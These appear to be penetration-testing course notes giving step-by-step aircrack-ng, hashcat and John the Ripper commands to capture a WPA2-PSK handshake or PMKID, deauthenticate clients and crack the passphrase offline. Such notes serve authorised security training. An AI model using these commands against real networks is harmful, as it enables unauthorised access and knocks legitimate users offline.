# WPA/WPA2-PSK Handshake Crack
Capture the 4-way handshake (or a PMKID), then crack offline with a wordlist. Only for `AUTH=PSK`, no Enterprise (MGT) and WPA3 / OWE aren't crackable.

## Capture
```sh
$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan0
$ sudo airodump-ng wlan0mon
$ sudo airodump-ng -c <CH> -w wpa --essid <ESSID> --bssid <BSSID> wlan0mon # leave running
# 2nd terminal - deauth a client to force the handshake
$ sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT> wlan0mon
# airodump top-right must show WPA handshake: <BSSID>
```
PMKID (clientless): if airodump shows `PMKID` in a client's Notes, it's already in the cap - no deauth needed

## Crack
```sh
$ aircrack-ng -w /usr/share/john/password.lst -e <ESSID> -b <BSSID> wpa-01.cap

# hashcat (convert first) — 22000 handles PMKID + EAPOL
$ hcxpcapngtool -o hash.hc22000 wpa-01.cap
$ hashcat -m 22000 hash.hc22000 /usr/share/john/password.lst
# (older) cap -> hccapx for mode 2500:
$ /usr/lib/hashcat-utils/cap2hccapx.bin wpa-01.cap out.hccapx
```

If the pass isn't in the list: JtR rules / crunch / rsmangler piped to aircrack:
```sh
$ john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e <ESSID> -w - wpa-01.cap
$ crunch 11 11 -t password%%% | aircrack-ng -e <ESSID> -w - wpa-01.cap
```

Verify: `airdecap-ng -b <BSSID> -e <ESSID> -p <PASS> wpa-01.cap`

## Troubleshooting (course)
- `WPA handshake` never appears: signal too weak / strong, or only a partial handshake was captured.
- Driver ignores **directed** deauth, send **broadcast**: `aireplay-ng -0 1 -a <BSSID> wlan0mon` (no `-c`)
- **802.11w** in use, unencrypted deauths are ignored: only option is to wait for a client to connect
